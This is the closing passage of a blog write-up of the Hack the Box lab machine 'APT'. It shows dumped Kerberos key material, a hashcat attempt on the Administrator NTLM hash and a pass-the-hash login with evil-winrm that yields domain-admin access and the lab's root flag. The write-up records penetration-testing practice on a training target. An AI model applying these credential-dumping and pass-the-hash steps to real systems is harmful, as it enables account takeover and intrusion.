APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up...
</pre></table></code></div></div><p>Using the template from the blog I was able to dump the hashes from the machine. There were not nearly as many accounts as in the backup! Now that I had the Administrator hash, it was time to crack it.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ hashcat -O -D1,2 -a0 -m1000 admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

...snipped...

Session..........: hashcat                       
Status...........: Exhausted
Hash.Name........: NTLM
Hash.Target......: c370bddf384a691d811ff3495e8a72e2
Time.Started.....: Thu Apr  1 18:11:53 2021 (5 secs)
Time.Estimated...: Thu Apr  1 18:11:58 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2957.7 kH/s (0.60ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 6538/14344385 (0.05%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[213134356173382a] -&gt; $HEX[042a0337c2a156616d6f732103]

Started: Thu Apr  1 18:11:51 2021
Stopped: Thu Apr  1 18:11:59 2021
</pre></table></code></div></div><p>I was able to go through all of <code class="language-plaintext highlighter-rouge">rockyou.txt</code> in less than 10 seconds, but the password was not in it. I decided to just try to use the hash to log in instead.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ evil-winrm -u Administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb.local

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents&gt; whoami /all

USER INFORMATION
----------------

User Name         SID
================= ============================================
htb\administrator S-1-5-21-2993095098-2100462451-206186470-500


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
HTB\Domain Admins                          Group            S-1-5-21-2993095098-2100462451-206186470-512 Mandatory group, Enabled by default, Enabled group
HTB\Group Policy Creator Owners            Group            S-1-5-21-2993095098-2100462451-206186470-520 Mandatory group, Enabled by default, Enabled group
HTB\Enterprise Admins                      Group            S-1-5-21-2993095098-2100462451-206186470-519 Mandatory group, Enabled by default, Enabled group
HTB\Schema Admins                          Group            S-1-5-21-2993095098-2100462451-206186470-518 Mandatory group, Enabled by default, Enabled group
HTB\Denied RODC Password Replication Group Alias            S-1-5-21-2993095098-2100462451-206186470-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents&gt; $env:username;$env:computername
Administrator
APT
</pre></table></code></div></div><p>I was able to log in as <code class="language-plaintext highlighter-rouge">Administrator</code>!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/apt-secretsdump.svg" alt="Make sure to use -H for hash, and not -p for password!" /></p><h3 id="roottxt">Root.txt</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="o">..</span><span class="nx">/Desktop</span><span class="w">
</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">


    </span><span class="n">Directory</span><span class="p">:</span><span class="w"> </span><span class="n">C:\Users\Administrator\Desktop</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="n">LastWriteTime</span><span class="w">         </span><span class="n">Length</span><span class="w"> </span><span class="n">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-ar</span><span class="o">---</span><span class="w">         </span><span class="mi">4</span><span class="n">/1/2021</span><span class="w">   </span><span class="nx">9:35</span><span class="w"> </span><span class="nx">AM</span><span class="w">             </span><span class="nx">34</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">


</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
</span><span class="mi">366</span><span class="n">c36e30001577410f0a8c5c89dbd15</span><span class="w">
</span></pre></table></code></div></div><p>After changing directories to the Desktop I was able to collect my proof!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/apt-0-pwned.png" alt="Image showing a successful completion of this challenge" /></p><p>Thanks to <a href="https://app.hackthebox.eu/users/9164"><code class="language-plaintext highlighter-rouge">cube0x0</code></a> for making such a fun and challenging machine. The harder-difficulty Windows challenges are rare, and I have enjoyed each one of them. This one gave me a chance to learn a lot about using some of the standard Impacket tools in new ways, such as using Kerberos tickets along with IPv6. I look forward to doing more like this in the future!</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/impacket/" class="post-tag no-text-decoration" >impacket</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/ipv6/" class="post-tag no-text-decoration" >ipv6</a> <a href="/tags/rpc/" class="post-tag no-text-decoration" >rpc</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >kerberos</a> <a href="/tags/pass-the-hash/" class="post-tag no-text-decoration" >pass the hash</a> <a href="/tags/ntlm/" class="post-tag no-text-decoration" >ntlm</a> <a href="/tags/lmcompatibilitylevel/" class="post-tag no-text-decoration" >lmcompatibilitylevel</a> <a href="/tags/responder/" class="post-tag no-text-decoration" >responder</a> <a href="/tags/ntp/" class="post-tag no-text-decoration" >ntp</a> <a href="/tags/registry/" class="post-tag no-text-decoration" >registry</a> <a href="/tags/insane/" class="post-tag no-text-decoration" >insane</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/cube0x0/" class="post-tag no-text-decoration" >cube0x0</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - APT Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/apt/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - APT Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/apt/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - APT Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/apt/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/resolute/"><div class="card-body"> <span class="timeago small" > May 24, 2020 <i class="unloaded">2020-05-24T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Resolute Writeup</h3><div class="text-muted small"><p> HTB - Resolute Overview A medium-difficulty Windows box that was fairly straightforward. Privilege escalation required going through two different users and taking advantage of Windows domain ...</p></div></div></a></div><div class="card"> <a href="/posts/monteverde/"><div class="card-body"> <span class="timeago small" > May 30, 2020 <i class="unloaded">2020-05-30T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Monteverde Writeup</h3><div class="text-muted small"><p> HTB - Monteverde Overview Short description to include any strange things to be dealt with…when there is a proper description here the website build will stop breaking. Hopefully this is enough...</p></div></div></a></div><div class="card"> <a href="/posts/blunder/"><div class="card-body"> <span class="timeago small" > Jun 9, 2020 <i class="unloaded">2020-06-09T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Blunder Writeup</h3><div class="text-muted small"><p> HTB - Blunder Overview This easy difficulty Linux machine featured a content management system that was new to me, and a simple to use but interesting way to bypass a common configuration used ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/luanne/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Luanne Writeup</p></a> <a href="/posts/execute-in-memory/" class="btn btn-outline-primary" prompt="Newer"><p>Execute remote scripts from memory</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
